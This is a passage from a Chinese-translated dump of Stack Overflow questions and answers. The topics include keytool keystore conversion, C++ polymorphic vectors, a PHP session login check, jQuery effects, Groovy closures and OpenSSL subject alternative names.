
**答案：** keytool -importkeystore -srckeystore PFX_P12_FILE_NAME -srcstoretype pkcs12 -srcstorepass PFX_P12_FILE -srcalias SOURCE_ALIAS -destkeystore KEYSTORE_FILE -deststoretype jks -deststorepass PASSWORD -destalias ALIAS_NAME

**注意：**要查找 srcalias，请列出 PFX/P12 文件的内容：

keytool -v -list -storetype pkcs12 -keystore PFX_P12_FILE > FILENAME.TXT 因为这会将命令的输出写入名为 FILENAME.TXT 的文件。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2021-06-12T00:24:25.220

我遇到了同样的问题，我手动输入了密码，问题得到了解决

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2015-10-21T09:54:20.340

我今天遇到了同样的问题（BadPaddingException）。似乎 keytool 的密码中的某些字符有问题。我通过在密码周围添加双引号来解决它。

keytool -importkeystore -srckeystore PFX_P12_FILE_NAME -srcstoretype pkcs12 -srcstorepass "PFX_P12_FILE" -srcalias SOURCE_ALIAS -destkeystore KEYSTORE_FILE -deststoretype jks -deststorepass "PASSWORD" -destalias ALIAS_NAME

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2018-04-24T14:33:32.623

当我尝试从 JKS 将证书导出为 pfx 时，我遇到了类似的问题。当我在 keytool 命令中排除 deststorepass 属性并在运行时提供目标存储密码时，它起作用了。

keytool -importkeystore -srckeystore Keystore.jks -destkeystore dv163.pfx -srcstoretype JKS -deststoretype PKCS12 -srcalias alias1-destalias alias1

输入目标密钥库密码：

重新输入新的密码：

输入源密钥库密码：

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-01-02T00:47:01.823

我做了这个命令（与你的相反）将私钥从 JKS 导出到 PKCS12：

keytool -importkeystore -srckeystore DemoIdentity.jks -srcstoretype JKS -destkeystore demoidentity.p12 -deststoretype PKCS12

如果我省略了看似多余的“-srcstoretype JKS”，当我尝试在 keytool 中列出详细信息时，生成的 demoidentity.p12 文件给了我同样的错误，即使上面的命令接受了密码并生成了一个看似正确的文件！

对于您的问题，也许您在生成 keystore.p12 时做了类似的事情。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-12-01T15:50:46.857

在我这边，当您输入密码时，我忘记检查语言:)[![在此处输入图像描述](../Images/4e497f6b3da3eee6341c548c1ae737cb.png)](https://i.stack.imgur.com/09XmI.png)

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2021-07-06T12:36:52.433

只需在构建签名的 APK 向导表单上输入正确的密码。（它在 android studio 4.2 canary 15++ 上和我一起工作）

正如我发现的那样，当您在所述向导上更改应用程序时，尽管密码仍然存在，但不知何故它没有正确签名，因此您需要清除密码并再次输入。

# jquery - 带有 ZendFramework 的 jQuery Mobile

> ID：10338546
> 
> 赞同：0
> 
> 时间：2012-04-26T17:38:36.687
> 
> 标签：jquery, zend-framework, jquery-mobile

如果我创建了我的站点的两个版本，一个是普通版本，一个是在服务器上名为“mobile”的文件夹中，我如何才能监听移动设备并将用户定向到移动文件夹？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:40:51.513

您的着陆页需要[检测](http://www.quirksmode.org/js/detect.html)和重定向。使用 javascript，这可以很容易地完成：

```
// note this regex is probably **not** the 
// best one to use for mobile user agent detection
if(navigator.userAgent.match(/ios|android|windows phone/)) {
    window.location = 'http://mysite.com/mobile';
} 
```

如果您使用的是服务器端技术，您可以在那里进行重定向，因为这是首选方法，因为大多数移动设备都可以禁用 javascript。请参阅[此处的答案](https://stackoverflow.com/questions/4483180/how-to-rewrite-to-mobile-myurl-com-if-user-is-mobile-use-apache-or-inside-weba)，例如如何使用 apache 执行此操作。

# c++ - 制作不同子类实例的向量

> ID：10338548
> 
> 赞同：6
> 
> 时间：2012-04-26T17:38:38.960
> 
> 标签：c++, oop, class, abstract

尝试搜索，没有返回（我认为）。

是否可以制作抽象类的向量？

例如，我有超类 Unit。

我有子类士兵、车辆和轰炸机。

但是我想要一个向量中的任何子类的实例，例如向量 UnitList 可以同时包含士兵和车辆的实例？

这可能吗？如果有帮助，我正在使用 C++。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-26T17:39:35.010

是的，但您需要使用指针或智能指针（我会选择这个）。

```
struct X
{
    virtual ~X() {}  //<--- as pointed out in the comments
                     // a virtual destructor is required
                     // for correct deletion
    virtual void foo() = 0;
};
struct Y : X
{
    virtual void foo() { }
};

int main()
{
    std::vector<X*> a;
    a.push_back(new Y);
    a[0]->foo();
    for ( int i = 0 ; i < a.size() ; i++ )
        delete a[i];
    return 0;
} 
```

不要忘记删除分配的内存。

### 为什么不能使用实际对象：

假设`std::vector<X>`。这是非法的，因为：

1.  如果你想用一些元素初始化你的向量，分配会失败。向量将对象内部存储在连续内存中。预分配会失败，因为这意味着它需要创建对象，而抽象类无法做到这一点。

2.  即使你可以，或者基类不是抽象的，它也不会有太大帮助，因为你会遭受**对象切片**的痛苦。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-04-26T17:53:04.653

由于这些对象中的每一个都有不同的大小，因此正确的方法是使用包含指向基类的指针的容器`Unit`，（并确保它具有`virtual`析构函数。

选项 1：（[`boost::ptr_vector`](http://www.boost.org/doc/libs/1_49_0/libs/ptr_container/doc/ptr_vector.html)需要 boost 库，无论如何你都应该拥有）

```
ptr_vector<Unit> units;
units.push_back(new Soldier()); 
```

选项 2：（`std::vector<std::unique_ptr<Unit>>`需要 C++11 编译器）

```
std::vector<std::unique_ptr<Unit>> units;
units.emplace_back(std::unique_ptr<Unit>(new Soldier())); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-26T17:43:28.773

您不能从字面上创建抽象类对象的向量，因为向量模板需要能够在编译时告诉编译器其元素的大小。但是，您可以通过保留指向对象的指针向量而不是对象向量来获得所需的内容。

*更新：* 抽象类本身的大小是已知的。它实际上是它们最派生类型的实例，其大小在编译时是未知的。（感谢@LuchianGrigore 和@MooingDuck 指出这一点。）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-26T17:44:42.833

我认为不可能这样做：

```
std::vector<Unit> unit_list;
unit_list.push_back(Soldier(params)); 
```

因为士兵、车辆和单位占用的内存量不同。

但是，可能可以使用指针，因为所有指针都占用固定数量的内存：

```
std::vector<Unit*> unit_list;
unit_list.push_back(new Soldier(params)); 
```

我没有测试过它，但无论如何它在我的脑海中是有道理的。

# c# - 将代码从 C#.net 移植到 C++ MFC - 加载 DLL 问题 - 入口点索引

> ID：10338549
> 
> 赞同：0
> 
> 时间：2012-04-26T17:38:41.523
> 
> 标签：c#, visual-c++, dllimport

我需要在 C++ MFC 中执行与下面的 C# .net 代码相同的操作，你们能帮帮我吗？

```
using System;
using System.Text;
using System.Runtime.InteropServices;

namespace ConsoleApplication1
{
    class Program
    {
        [DllImport("shell32.dll", EntryPoint = "#261",
            CharSet = CharSet.Unicode, PreserveSig = false)]
        public static extern void GetUserTilePath(
          string username, 
          UInt32 whatever, // 0x80000000
          StringBuilder picpath, int maxLength);

        public static string GetUserTilePath(string username)
        {   // username: use null for current user
            var sb = new StringBuilder(1000);
            GetUserTilePath(username, 0x80000000, sb, sb.Capacity);
            return sb.ToString();
        }

        [STAThread]
        static void Main(string[] args)
        {
            string path =GetUserTilePath(null);
            Console.WriteLine("path = %s", path);
        }
    }
} 
```

我无法从 #261（或 261）入口点和/或其对 C++ 的确切签名访问 GetProcAddress。

编辑：这是诀窍

```
HMODULE shell32Dll= ::LoadLibrary(L"shell32.dll");

HRESULT (__stdcall *getUserImage)(LPCWSTR userName,
                        DWORD zero , LPWSTR outPath, UINT size);

(FARPROC&)getUserImage = ::GetProcAddress(shell32Dll, MAKEINTRESOURCEA(261));
if(getUserImage)
{
        WCHAR outPath[MAX_PATH];
        getUserImage(NULL,0x80000000,outPath,MAX_PATH);
} 
```

MAKEINTRESOURCEA(261) 而不是 "#261" 或 "261" 让工作完成！

谢谢！卡梅伦！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:47:22.997

从[GetProcAddr 文档](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683212%28v=vs.85%29.aspx)：

> lpProcName [in]
> 函数或变量名，或函数的序数值。**如果这个参数是一个序数值，它必须在低位字中**；高位字必须为零。

事实证明你应该这样称呼它：

```
(FARPROC&)getUserImage = ::GetProcAddress(shell32Dll, MAKEINTRESOURCE(261)); 
```

# resources - glassfish-web.xml 与 domain.xml 的替代文档根

> ID：10338552
> 
> 赞同：1
> 
> 时间：2012-04-26T17:38:49.173
> 
> 标签：resources, glassfish, glassfish-3

我需要一个备用文档根属性才能将我上传的图像放在应用程序目录之外。我让它在 glassfish-web.xml 中正常工作，如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE glassfish-web-app PUBLIC "-//GlassFish.org//DTD GlassFish Application Server 3.1 Servlet 3.0//EN" "http://glassfish.org/dtds/glassfish-web-app_3_0-1.dtd">
<glassfish-web-app>
    <context-root>/</context-root>
    <property name="alternatedocroot_1" value="from=/uploads/* dir=c:/development/mm_uploads" description="Uploaded Images"/>
</glassfish-web-app> 
```

我对该实现的问题是我会将这个文件签入代码库，这在为其他环境（不同的目录路径）构建战争时效果不佳。

我尝试放入 domain.xml （认为这将是特定于服务器的，而不是在代码库中），但无法让它工作。我把它作为域的孩子，但没有运气。没有错误，它只是没有工作。

有任何想法吗？我应该能够在 domain.xml 中使用相同的属性设置，对吧？

如果这是不好的做法，还有其他选择吗？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-02T11:20:38.827

就我而言，我无法让 glassfish-web.xml alternatedocroot_n 工作。但是，当我使用 Glassfish 管理控制台虚拟服务器 --> 服务器附加属性在 domain.xml 中放置相同的条目时，alternatedocroot_n 立即起作用。（服务器重新启动后）。仅供参考：我尝试使用符号链接，但没有奏效。

我正在使用在 Linux 5 上运行的 Glassfish 3.1.2。alternatedocroot 指向 ExtJs 4.0.7 库。

**域.xml：**

```
 <virtual-server id="server" network-listeners="http-listener-1,http-listener-2">
      <property name="alternatedocroot_1" value="from=/extjs.4.0.7/* dir=/usr/lib/js"></property>
    </virtual-server> 
```

这相当于 /usr/lib/js/extjs.4.0.7/...

希望这可以帮助某人..

**index.jsp：**

```
<link rel="stylesheet" type="text/css" href="/extjs.4.0.7/resources/css/ext-all.css">
<script type="text/javascript" src="/extjs.4.0.7/ext-all-debug.js"></script> 
```

# python - 扭曲的python垃圾收集

> ID：10338555
> 
> 赞同：2
> 
> 时间：2012-04-26T17:39:08.780
> 
> 标签：python, garbage-collection, twisted

我目前正在开发一个 python 扭曲服务器用作消息处理应用程序。我遇到了一个奇怪的问题。

我指定我的类来处理到服务器的 get_POST，并将接收到的消息传递给进一步处理它的类。

消息处理成字典，该字典是每次有新消息时都会实例化的对象的成员。但是，在（例如）一条消息包含字典的 10 个项目之后，当处理只有 9 个条目的消息时，第 10 个仍然会在字典中。

我已经能够通过在处理消息之前明确清除字典来解决这个问题，例如：

d = {}

但是，我很困惑，因为在进一步处理字典并在每条新消息上重新实例化之后，该对象应该超出范围并收集垃圾。它似乎表现得好像对象不是一个实例并且保留成员就好像它是一个单例，或者成员是静态的。

在扭曲的框架下，正常范围策略的行为是否相同，或者我是否需要做一些额外的事情来确保对象在超出范围时被 GC？

谢谢！

-乔。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:10:00.730

你如何初始化包含字典的类？我想如果您使用以下内容：

```
class YourClass(object):
     def __init__(self):
         self.d = {} 
```

它会解决你的问题。除非它是某种对象，它不是在每条消息上都实例化，而是由 Twisted 框架池化和重用。您是否尝试将某种日志输出添加到`__init__`您的类的方法中，以查看它是否实际上是按消息实例化的？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:16:53.230

我怀疑你的类定义看起来像这样：

```
class MyCoolMessage(object):
    d={}
    def addMessage(self,incoming_msg):
        d['a']=incoming_msg[0]
        d['b']=incoming_msg[1]
        d['c']=incoming_msg[2] 
```

这与上面@John Gaines Jr. 指出的不同，他的方法是正确的。**您应该在init**中而不是在类级别上初始化每个实例变量。

问题与

```
class MyCoolMessage(object):
    d={} 
```

设置是 d 的范围成为类而不是实例，它甚至应该可以在没有通过启动类的情况下访问

```
print (MyCoolMessage.d) 
```

# html - Perl CGI 的复选框

> ID：10338556
> 
> 赞同：3
> 
> 时间：2012-04-26T17:39:21.790
> 
> 标签：html, perl, checkbox, cgi

抱歉，如果我的问题太简单，我刚开始使用 CGI ......所以我有一堆同名的复选框。示例 HTML：

```
<form action="/cgi-bin/checkbox.cgi" method="POST">
<input name="Loc_opt" value="Loc_1" type="checkbox">Option 1<br>
<input name="Loc_opt" value="Loc_2" type="checkbox">Option 2<br>
<input name="Loc_opt" value="Loc_3" type="checkbox">Option 3<br>
<input type="submit" value="Submit">
</form> 
```

我需要找出其中哪些是使用 Perl CGI 检查的。我在 checkbox.cgi 中有以下内容：

```
print "Content-type:text/html\r\n\r\n";
local ($buffer, @pairs, $pair, $name, $value, %FORM);
    # Read in text
    $ENV{'REQUEST_METHOD'} =~ tr/a-z/A-Z/;
    if ($ENV{'REQUEST_METHOD'} eq "POST")
    {
    read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
    }else {
    $buffer = $ENV{'QUERY_STRING'};
    }
    # Split information into name/value pairs
    @pairs = split(/&/, $buffer);
    foreach $pair (@pairs)
    {
    ($name, $value) = split(/=/, $pair);
    $value =~ tr/+/ /;
    $value =~ s/%(..)/pack("C", hex($1))/eg;
    $FORM{$name} = $value;
    } 
```

我现在应该怎么做才能打印所选复选框的值？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-26T18:01:46.943

如果您有多个具有相同名称的表单元素，则需要将 param() 结果设置为数组。来自[CGI101](http://www.cgi101.com/book/ch5/text.html)：

```
my @colors = param('color');
foreach my $color (@colors) {
    print "You picked $color.<br>\n";
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-26T18:16:47.073

```
use strict; use warnings;
use CGI;

my $cgi = CGI->new;
my @opt = $cgi->param('Loc_opt'); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-26T17:57:21.100

请阅读[CGI 模块](http://perldoc.perl.org/CGI.html)的 Perl 文档。有一些简单的内置方法可以处理所有这些。

# .net - 如何在 SPD 2007 的 ASP 文本框的数据绑定部分使用查询字符串参数？

> ID：10338558
> 
> 赞同：1
> 
> 时间：2012-04-26T17:39:31.647
> 
> 标签：.net, textbox, sharepoint-2007, data-binding

我目前正在尝试找到一种方法，通过传递给页面的查询字符串动态设置`"New Item" DataFormWebPart SPD 2007 ASPX`写入文件的页面中的字段。`XML`

理想情况下，它会像这样工作：

页面会这样打开：

> ../newitem.aspx?SerialNo=1234

然后在页面内，写入子节点的文本框`SerialNo`将在下创建一个新项目`SerialNo "1234"`

XML 模式如下所示：

连续剧

```
------Serial

         <SerialNo>1234</SerialNo>

         ------Items

               -----Item

                   <ItemName></ItemName>

                   <ItemAmount></ItemAmount> 
```

基本上我正在尝试`item`通过`TextBoxes`for`itemName`和`itemAmount`，在适当的`SerialNo`.

**是否可以通过在文本框的数据绑定部分中使用变量来做到这一点？**

IE

```
asp:TextBox runat="server" id="ff1{$Pos}" __designer:bind="{ddwrt:DataBind('i',concat('ff1',$Pos),'Text','TextChanged','','/Serials/Serial[{$SerialNo}]/Items/Item[new]','ItemName')}" /> 
```

# encryption - 如果在网站之间交换，是否需要对加密数据进行编码

> ID：10338562
> 
> 赞同：1
> 
> 时间：2012-04-26T17:39:52.147
> 
> 标签：encryption, encoding, urlencode, url-encoding, data-exchange

我们有多个站点，我们需要在它们之间发布值。

我正在使用 phpseclib (http://phpseclib.sourceforge.net/) 库进行加密-解密。

加密数据后，在其他网站上发布是否安全。

我的工作场景如下：

假设我有一个字符串需要从 example1.com 发布到 example2.com

首先，在 example1.com，我将使用库提供的函数加密字符串。然后，加密字符串将设置为隐藏表单字段的值，该字段会将数据发布到 example2.com

将加密值直接发布到 example2.com 是否安全？或者我应该使用一些编码函数，如 json_encode 或 url_encode 来对加密数据进行编码并确保网站之间的交易安全？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:44:50.897

如果与号、百分比是加密字符串的一部分，则对消息进行编码的 url 可能会破坏解密。

Json 编码只要在解密前以相同的方式解码以去除转义序列就可以了。

对于 php，您将创建一个键/值对，其中您的值是加密字符串。这是有关如何使用 PHP json 编码的一些帮助。

[如何使用 json_encode](https://stackoverflow.com/questions/10377570/how-to-use-json-encode)

JavaScript 任何现代浏览器和 IE8+ 中都有两种 JSON 方法：

JSON.stringify(obj) — 将 JavaScript 对象转换为 JSON 字符串 JSON.parse(str) — 将 JSON 字符串转换回 JavaScript 对象

如果您需要旧版 IE 支持，请使用[https://github.com/douglascrockford/JSON-js](https://github.com/douglascrockford/JSON-js)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:23:37.993

[Base64 编码](http://php.net/manual/en/function.base64-encode.php)对于发布二进制数据来说是相当标准的，只有 33% 的开销。

# jquery - jquery fadeIn/Out el 然后fadeIn/Out new el

> ID：10338567
> 
> 赞同：0
> 
> 时间：2012-04-26T17:40:47.607
> 
> 标签：jquery, click, fadein, fadeout

抱歉标题随意编辑，

无论如何，这是我到目前为止的代码

```
$('#foo').click(function() {

  $('#foo2').html('<h4>Please wait...</h4>').fadeOut('fast');

  var sful = $('#foo3').fadeIn('fast').html('<h4>Success!</h4>').fadeOut('slow');
  setTimeout(sful, 4000);

}); 
```

我试图让**#foo2**在点击时淡入淡出，然后让它淡入淡出，然后**#foo3** (var sful) 在之后淡入/淡出。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:44:55.413

```
$('#foo2').html('<h4>Please wait...</h4>').fadeOut('fast', function() {
  var sful = $('#foo3').fadeIn('fast').html('<h4>Success!</h4>').fadeOut('slow');
  setTimeout(sful, 4000);
}); 
```

**回调**(将`function() { ..`在动画完成后运行。请参阅[http://api.jquery.com/fadeOut/](http://api.jquery.com/fadeOut/)（特别是该`[,callback]`部分）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:44:44.267

```
$('#foo2')
          .html('<h4>Please wait...</h4>')
          .fadeOut('fast', function() {  // callback start after fadeOut()
                             setTimeout(function() {
                                 $('#foo3')
                                       .fadeIn('fast')
                                       .html('<h4>Success!</h4>')
                                        .fadeOut('slow');
                              }, 4000);
                           }); 
```

# properties - 自动属性获取器、局部变量和闭包之间的 Groovy 冲突？

> ID：10338569
> 
> 赞同：6
> 
> 时间：2012-04-26T17:40:49.590
> 
> 标签：properties, groovy, closures

Groovy 似乎有一些与“Groovy Beans”和闭包相关的非常不愉快的行为，这些行为可能导致它在某些情况下屏蔽局部变量。

这是已知的行为吗？是否有一些文档详细说明了这些内容？我浪费了很多时间试图弄清楚什么不起作用......

考虑以下代码：

```
class TestClass {

    def doIt(Closure closure) {
        closure.setDelegate(this)
        closure.call()
    }

    def getRevision() {
        return "testclass revision"
    }
}

def testIt() {
    def revision = "testit revision"

    println "1: " + revision + " (expect: testit)"

    TestClass tester = new TestClass()
    tester.doIt {
        println "2: " + getRevision()  + " (expect: testclass)"
    }

    println "3: " + revision + " (expect: testit)"

    tester.doIt {
        println "4: " + revision + " (expect: testit)"
        revision = getRevision()
        println "5: " + revision + " (expect: testclass)"
        println "6: ${getRevision()} (expect: testclass)"
        println "7: " + getRevision() + " (expect: testclass)"
    }

    // expect to have been set to testclass value in previous closure
    println "8: " + revision + " (expect: testclass)"

    tester.doIt {
        println "9: ${getRevision()} (expect: testclass)"
        println "10: " + getRevision() + " (expect: testclass)"
    }

    println "11: " + revision + " (expect: testclass)"
}

testIt() 
```

运行此代码会产生以下输出：

```
1: testit revision (expect: testit)
2: testclass revision (expect: testclass)
3: testit revision (expect: testit)
4: testit revision (expect: testit)
5: testit revision (expect: testclass)
6: testit revision (expect: testclass)
7: testit revision (expect: testclass)
8: testit revision (expect: testclass)
9: testclass revision (expect: testclass)
10: testclass revision (expect: testclass)
11: testit revision (expect: testclass) 
```

我的主要问题是 5/6/7。似乎只是`revision`在闭包中使用局部变量“隐藏”`getRevision()`了委托中的方法，并将其替换为自动生成的 bean 样式`getRevision()`以匹配`revision`“属性”。如果我不使用该`revision`变量，则调用`getRevision()`不会调用此 bean 行为。

任何见解或文档链接将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:16:26.700

Groovy 闭包[具有`resolveStrategy`](http://groovy.codehaus.org/gapi/groovy/lang/Closure.html#setResolveStrategy%28int%29)可用于控制解析顺序的[属性。](http://groovy.codehaus.org/gapi/groovy/lang/Closure.html#setResolveStrategy%28int%29)默认策略是从“拥有”对象中查找属性，并且只有在无法找到该属性时才能使用委托。我相信将其设置为[`DELEGATE_FIRST`](http://groovy.codehaus.org/gapi/groovy/lang/Closure.html#DELEGATE_FIRST)将获得您所期望的行为。

# c# - asp.net 控件无法获取值或文本

> ID：10338570
> 
> 赞同：1
> 
> 时间：2012-04-26T17:40:50.400
> 
> 标签：c#, asp.net

我的页面上有一个 cleEditor，它需要 rows="" cols="" 并且当我执行 runat="Server" 时，asp.net 不喜欢这样

为了解决这个问题，我尝试使用 FindControl，但我似乎无法以这种方式获取价值。

这是我的代码：

```
protected void os_submit_Click ( object sender, EventArgs e )
{
    Control cleEditor = FindControl( "editor2" );
    MailMessage mm = new MailMessage( "OnlineSignup@help.com", "help@help.com" );
    mm.Subject = "Online Signup Checklist";
    mm.Body = cleEditor.value; // Trying to grab the value of the textarea
    mm.IsBodyHtml = true;
    SmtpClient smtp = new SmtpClient();
    smtp.Host = "127.0.0.1";
    smtp.Port = 25;
    smtp.Send( mm );
} 
```

我有一个 ID 为 editor2 的 TextArea。在幕后 jquery 把它变成了一个富文本编辑器。我需要 asp.net 能够获取此文本区域的值/文本。

谁能看到我做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T17:53:16.373

不要放在`runat="server"`TextArea 上并执行以下操作：

```
protected void os_submit_Click ( object sender, EventArgs e )
{
    MailMessage mm = new MailMessage( "OnlineSignup@help.com", "help@help.com" );
    mm.Subject = "Online Signup Checklist";
    mm.Body = Request.Form["editor2"]; // Trying to grab the value of the textarea
    mm.IsBodyHtml = true;
    SmtpClient smtp = new SmtpClient();
    smtp.Host = "127.0.0.1";
    smtp.Port = 25;
    smtp.Send( mm );
} 
```

# php - 闯入 SESSION 变量

> ID：10338574
> 
> 赞同：0
> 
> 时间：2012-04-26T17:40:53.493
> 
> 标签：php, security, session

在我项目中的每个 PHP 文件中，我都使用以下代码，这样没有人可以在不登录的情况下进入网站：

```
<?php
    session_start();
    if($_SESSION['userid']!="myuserid"){
        header("Location: Adminlogon.php");
    }
?> 
```

请注意，我只需要一个用户 ID，用户 ID 和密码在一组人之间共享。

这段代码安全吗？我能做得更好吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:46:38.510

这将是安全的，但是当您使用纯 HTTP 时，cookie 和会话很容易在 LAN 中“劫持”。所以强制你的应用服务器使用 HTTPS

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:57:50.817

您的代码不安全，因为实际上它并不能阻止每个脚本被执行——这是您真正想要阻止的。

如果会话设置不正确，为了防止执行，您需要保留文件，例如使用 return 语句：

```
<?php
    session_start();
    if ($_SESSION['userid'] != "myuserid")
    {
        header("Location: Adminlogon.php");
        return; ### leave this script/include
    }
?> 
```

`return`您也可以使用`exit`or语句代替`die`基本脚本。

# jquery-plugins - 如果在关闭之前调用 print()，Colorbox 不会立即关闭 - 为什么？

> ID：10338575
> 
> 赞同：0
> 
> 时间：2012-04-26T17:40:55.030
> 
> 标签：jquery-plugins, colorbox

我在 iframe 模式下使用 Colorbox，并看到一个奇怪的问题，我希望能得到一些帮助。我的 iframe 包含一个表单和另一个 iframe（其中包含要打印的内容的预览），在我的表单提交处理程序上，我想在嵌入的 iframe 上调用 window.print() 然后关闭颜色框。我的代码是这样连接的：

```
 $('#printer_friendly_form').submit(function () {
            var previewWindow = $('iframe#print_preview').get(0).contentWindow;
            setZoom($('html', previewWindow.document), 1);
            previewWindow.focus();
            previewWindow.print();
            $('#print_preview').css('visibility', 'hidden');
            parent.$.colorbox.close();
            return false;
        }); 
```

“setZoom”位是我正在做的一个小技巧，它可以缩小嵌入 iframe 中的内容，以便在没有水平滚动条的情况下进行打印预览；在打印之前，我将缩放设置回 1，以便正确打印出来。我已经尝试删除此代码，但它似乎不会影响手头的问题。

我遇到的问题是，在 Chrome 上，在我关闭 Chrome 的打印预览对话框后，颜色框最终关闭需要 5-8 秒。如果我删除“previewWindow.print()”行，颜色框会立即关闭。从我的调试来看，Chrome 将打印视为同步调用，因此仅在打印对话框消失后才调用 close。但是它在之后立即被调用，并且函数返回——所以我不知道如何解释实际关闭的延迟。

我还在 IE9 上发现颜色框会立即关闭（甚至在打印对话框出现之前，这意味着 IE 必须是异步的）。同样，Firefox（似乎也像 Chrome 一样是同步的）在打印对话框完成后立即关闭颜色框。

这是 Chrome 错误/“功能”，还是我应该做其他事情才能让对话框立即关闭？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T03:22:09.387

这听起来令人沮丧。我想不出 ColorBox 的任何事情会促成这一点，所以我认为它是不相关的。如果您执行除颜色框以外的其他内容（例如警报），Chrome 是否也会发生同样的事情？

# javascript - 在 Firefox 中使用 JavaScript 刷新页面

> ID：10338577
> 
> 赞同：1
> 
> 时间：2012-04-26T17:41:04.143
> 
> 标签：javascript, firefox

我目前正在开发这个非常简单的基于文本的游戏，要再次玩，你必须刷新页面。这似乎在 Opera 和 Chrome 中有效，但它不会在 Firefox 中重置页面。这是我正在使用的功能。

```
$(function() {
    $('#play_again').click(function() {
        var answer = confirm ("Reset the game?")
        if (answer) {
        window.location.reload(); 
        }
    });
}); 
```

我认为 Firefox 正在缓存页面或其他东西。我怎样才能使这项工作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T18:06:10.307

`window.location.href`我建议不要使用`window.location.replace`. 为什么？因为`href`会在浏览器历史记录中添加一个新条目。这可能不是您所期望的行为。

```
window.location.replace( window.location.href ) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-26T17:45:53.753

这是很难做到的事情，但是您可以通过添加随机查询字符串来欺骗 IE 和 firefox 的缓存，使其认为这是一个新页面。你能试试像

```
window.location.href = window.location.href + '?refresh'; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T17:45:06.013

尝试

```
$(function () {
    $('#play_again').click(function () {
        var answer = confirm("Reset the game?")
        if (answer) {
            $("form").each(function () {
                this.reset();
            });
            window.location.reload();
        }
    });
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-01-08T04:26:52.653

这有效：

```
document.location=document.location; 
```

# attributes - openssl 主题替代名称扩展的奇怪行为

> ID：10338578
> 
> 赞同：0
> 
> 时间：2012-04-26T17:41:04.690
> 
> 标签：attributes, openssl

我正在尝试使用 openssl 生成具有多个替代名称的证书。

我有我的 CA 及其认证和密钥。

现在，我已经生成了一个带有一些主题替代名称的证书请求，并且使用 `openssl req -text -noout -in domain.csr` 我看到的命令与属性中的扩展主题替代名称是正确的。

在`openssl.cnf`我设置了`copy_extensions = copy`.

问题是，当我生成认证时，我获得了认证，但属性中没有扩展主题替代名称。

这可能是什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-01T13:37:10.060

在 openssl 配置中，您需要有 SAN 部分，并且您需要保留它，直到您自己发布它。

在我的页面上，您可以找到我的 SSL 请求生成器工具。也许这会对你有所帮助。

[http://vargaviktor.hu/openssl_generator_en.html](http://vargaviktor.hu/openssl_generator_en.html)

# iphone - 不能 pushViewController

> ID：10338579
> 
> 赞同：0
> 
> 时间：2012-04-26T17:41:17.167
> 
> 标签：iphone

我正在关注[HeadsUpUI上的教程](http://developer.apple.com/library/ios/#samplecode/HeadsUpUI/Introduction/Intro.html)

我只想添加额外的功能，例如如果我从**悬停单击****播放**或**暂停**按钮，我将移动到另一个名为**NextViewController**的视图控制器。

 ****我所做的是

> 1.- (IBAction)rightAction:(id)sender{
> 
> 1.  // 用户在 HoverView 中点击了右键
> 2.  [self showHoverView:NO];
> 3.  NextViewController *controller = [[NextViewController alloc] initWithNibName:@"NextViewController" bundle:nil];
> 4.  [self.navigationController pushViewController：控制器动画：YES]；}

单击暂停或播放按钮后，什么也没有发生。但是，如果我将第 5 行替换为

> [自我presentModalViewController：控制器动画：YES]；

它有效。

如果你知道问题出在哪里，有人可以给我建议。欢迎任何意见在这里。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-26T17:48:15.567

没有导航控制器，因此您不能要求它推送新的视图控制器。任何视图控制器都可以呈现模态视图控制器，这就是您的第二个示例有效的原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:54:32.823

我有一个类似的问题。确保你的类是 UIViewController 的子类。您的 .h 文件应为：

```
.
.
.
@interface ClassName : UIViewController
.
.
. 
```****

# java - Java 将文本拆分为 2 个数组

> ID：10338580
> 
> 赞同：0
> 
> 时间：2012-04-26T17:41:21.613
> 
> 标签：java, android, html, arrays

我有以下文字：

```
 <option value="{0}">hello1</option>
    <option value="{1}">hello2</option>
    <option value="{2}">hello3</option>
    <option value="{3}">hello4</option>
    <option value="{4}">hello5</option>
    <option value="{5}">hello6</option>
    <option value="{6}">hello7</option>
    <option value="{7}">hello8</option> 
```

以上所有内容都在一个字符串中。

我有 2 个数组：

```
valueArray;
nameArray; 
```

那么，关于如何将 helloX 放入 nameArray 并将所有值放入 valueArray 的任何提示？

//西蒙

* * *

## 回答 #1

